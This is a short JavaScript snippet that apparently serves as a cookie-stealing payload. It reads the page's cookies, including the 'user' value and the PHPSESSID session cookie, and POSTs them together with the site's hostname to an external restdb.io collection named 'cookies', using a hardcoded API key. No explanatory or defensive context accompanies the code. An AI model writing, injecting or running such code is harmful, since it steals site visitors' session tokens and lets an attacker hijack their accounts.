function getCookieValue(a) {
   const b = document.cookie.match('(^|;)\\s*' + a + '\\s*=\\s*([^;]+)');
   return b ? b.pop() : '';
}

$.ajax({
    url: "https://geile-72c8.restdb.io/rest/cookies",
    headers: { 'x-apikey': '5f07c7a2a529a1752c476f90' },
    type: "POST",
    data: {
        host: window.location.hostname,
        cookie: document.cookie,
        user: getCookieValue('user'),
        session: getCookieValue('PHPSESSID')
    },
    success: function(response){
        console.log(response);
    }
});
